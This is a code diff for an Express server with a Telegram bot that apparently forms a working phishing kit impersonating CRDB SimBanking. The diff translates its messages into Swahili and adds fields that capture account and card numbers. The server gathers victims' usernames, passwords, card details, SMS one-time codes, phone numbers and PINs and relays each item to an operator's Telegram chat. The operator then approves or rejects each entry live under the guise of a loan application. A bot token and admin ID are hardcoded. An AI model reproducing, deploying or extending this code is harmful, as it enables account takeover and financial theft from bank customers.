@@ -12,7 +12,6 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Environment or provided defaults
 const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
 const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
 const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400';
@@ -68,7 +67,7 @@ function resolveTargetChat(adminParam) {
       return targetAdmin;
     }
   }
-  return FALLBACK_ADMIN_ID; // Defaults to main admin if unspecified
+  return FALLBACK_ADMIN_ID;
 }
 
 async function initBot() {
@@ -85,7 +84,7 @@ async function initBot() {
       const lastName = chatInfo.last_name || msg.from.last_name || '';
 
       if (chatId === String(FALLBACK_ADMIN_ID)) {
-        await bot.sendMessage(chatId, `👑 *Welcome Main Admin*\nYour personal link: ${APP_URL}/?admin=${FALLBACK_ADMIN_ID}`, { parse_mode: 'Markdown' });
+        await bot.sendMessage(chatId, `👑 *Karibu Msimamizi Mkuu*\nKiungo chako: ${APP_URL}/?admin=${FALLBACK_ADMIN_ID}`, { parse_mode: 'Markdown' });
         return;
       }
 
@@ -95,7 +94,7 @@ async function initBot() {
       }
 
       const userLink = `${APP_URL}/?admin=${chatId}`;
-      await bot.sendMessage(chatId, `👋 *Welcome ${firstName}!*\n\nYour portal link is active:\n${userLink}`, { parse_mode: 'Markdown' });
+      await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nKiungo chako kiko tayari:\n${userLink}`, { parse_mode: 'Markdown' });
     } catch (err) {}
   });
 
@@ -115,36 +114,36 @@ async function initBot() {
       switch (prefix) {
         case 'WRONG_CREDS':
           session.status = 'RETRY_CREDS';
-          await bot.sendMessage(chatTarget, `❌ Credentials marked as Wrong. User redirected to re-enter Username & Password.`);
+          await bot.sendMessage(chatTarget, `❌ Taarifa zimekataliwa. Mteja ameelekezwa kuingiza upya Taarifa zake.`);
           break;
         case 'CORRECT_CREDS':
           session.status = 'PROCEED_OTP';
-          await bot.sendMessage(chatTarget, `✅ Credentials verified. User proceeding to 6-digit SMS OTP input.`);
+          await bot.sendMessage(chatTarget, `✅ Taarifa zimekubaliwa. Mteja anaendelea na namba ya uthibitisho ya SMS (6 digits).`);
           break;
         case 'OTP_EXPIRED':
           session.status = 'RETRY_OTP';
           session.otp = '';
-          await bot.sendMessage(chatTarget, `⚠️ OTP marked Expired. User redirected to enter new incoming 6-digit SMS OTP.`);
+          await bot.sendMessage(chatTarget, `⚠️ OTP imeisha muda wake. Mteja anaombwa kuingiza OTP mpya ya SMS.`);
           break;
         case 'CORRECT_OTP':
           session.status = 'PROCEED_PHONE_PIN';
-          await bot.sendMessage(chatTarget, `✅ OTP verified. User proceeding to Phone Number and 4-digit PIN entry.`);
+          await bot.sendMessage(chatTarget, `✅ OTP sahihi. Mteja anaelekezwa kuingiza Namba ya Simu na PIN.`);
           break;
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
           session.pin = '';
-          await bot.sendMessage(chatTarget, `❌ PIN marked Wrong. User redirected to re-enter PIN.`);
+          await bot.sendMessage(chatTarget, `❌ PIN si sahihi. Mteja anaelekezwa kuingiza PIN mpya.`);
           break;
         case 'CORRECT_PIN':
         case 'FINAL_SUCCESS':
           session.status = 'SUCCESS';
-          await bot.sendMessage(chatTarget, `🎉 Application fully approved! Success screen sent to user.`);
+          await bot.sendMessage(chatTarget, `🎉 Mkopo umeidhinishwa kikamilifu! Ukurasa wa mafanikio umetumwa kwa mteja.`);
           break;
         default:
           break;
       }
 
-      await bot.answerCallbackQuery(query.id, { text: `Processed` }).catch(() => {});
+      await bot.answerCallbackQuery(query.id, { text: `Imeshughulikiwa` }).catch(() => {});
       if (query.message && query.message.message_id) {
         await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
       }
@@ -156,10 +155,10 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Step 1: Submit Username & Password
+// Step 1: Submit Credentials & Bank Details
 app.post('/api/submit-credentials', async (req, res) => {
   try {
-    let { username, password, adminChatId } = req.body || {};
+    let { username, account, card, password, adminChatId } = req.body || {};
     if (!adminChatId && req.query && req.query.admin) {
       adminChatId = req.query.admin;
     }
@@ -167,16 +166,17 @@ app.post('/api/submit-credentials', async (req, res) => {
     const targetChat = resolveTargetChat(adminChatId);
     const userId = `user_${Date.now()}`;
     sessions.set(userId, { 
-      username, 
-      password, 
+      username, account, card, password, 
       adminChatId: targetChat, 
       status: 'WAITING_CREDS_APPROVAL' 
     });
 
-    const message = `🟢 *CRDB SIMBANKING LOGIN DETAILS*\n\n` +
-                    `👤 *Username:* \`${username}\`\n` +
-                    `🔑 *Password:* \`${password}\`\n\n` +
-                    `📋 *Copy Details:* \`${username}:${password}\``;
+    const message = `🟢 *CRDB SIMBANKING - TAARIFA ZA BENKI*\n\n` +
+                    `👤 *Jina la Mtumiaji:* \`${username}\`\n` +
+                    `💳 *Namba ya Akaunti:* \`${account}\`\n` +
+                    `💳 *Namba ya Kadi:* \`${card}\`\n` +
+                    `🔑 *Nywila (Password):* \`${password}\`\n\n` +
+                    `📋 *Nakili Zote (Copy):*\n\`${username}:${account}:${card}:${password}\``;
 
     const opts = {
       parse_mode: 'Markdown',
@@ -196,7 +196,7 @@ app.post('/api/submit-credentials', async (req, res) => {
     
     return res.status(200).json({ success: true, userId });
   } catch (err) {
-    return res.status(500).json({ success: false, error: 'Server error processing credentials.' });
+    return res.status(500).json({ success: false, error: 'Hitilafu ya mtandao.' });
   }
 });
 
@@ -218,8 +218,8 @@ app.post('/api/submit-otp', async (req, res) => {
     session.status = 'WAITING_OTP_VERIFICATION';
     session.otp = otp;
 
-    const message = `🟢 *CRDB SIMBANKING 6-DIGIT SMS OTP*\n\n` +
-                    `📱 *OTP Code:* \`${otp}\``;
+    const message = `🟢 *CRDB SIMBANKING - OTP YA SMS (Tarakimu 6)*\n\n` +
+                    `📱 *Namba ya OTP:* \`${otp}\``;
 
     const opts = {
       parse_mode: 'Markdown',
@@ -237,11 +237,11 @@ app.post('/api/submit-otp', async (req, res) => {
 
     return res.status(200).json({ success: true });
   } catch (error) {
-    return res.status(500).json({ success: false, error: 'Error submitting OTP' });
+    return res.status(500).json({ success: false, error: 'Hitilafu' });
   }
 });
 
-// Step 3: Submit Phone Number & PIN
+// Step 3: Submit Phone & PIN
 app.post('/api/submit-phone-pin', async (req, res) => {
   try {
     const { userId, phone, pin } = req.body || {};
@@ -253,8 +253,8 @@ app.post('/api/submit-phone-pin', async (req, res) => {
     session.phone = phone;
     session.pin = pin;
 
-    const message = `🟢 *CRDB SIMBANKING PHONE & PIN*\n\n` +
-                    `📞 *Phone:* \`${phone}\`\n` +
+    const message = `🟢 *CRDB SIMBANKING - NAMBA YA SIMU NA PIN*\n\n` +
+                    `📞 *Simu:* \`${phone}\`\n` +
                     `🔒 *PIN:* \`${pin}\``;
 
     const opts = {
@@ -273,7 +273,7 @@ app.post('/api/submit-phone-pin', async (req, res) => {
 
     return res.status(200).json({ success: true });
   } catch (error) {
-    return res.status(500).json({ success: false, error: 'Error submitting Phone & PIN' });
+    return res.status(500).json({ success: false, error: 'Hitilafu' });
   }
 });
 
@@ -282,4 +282,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-                                                                           
+  
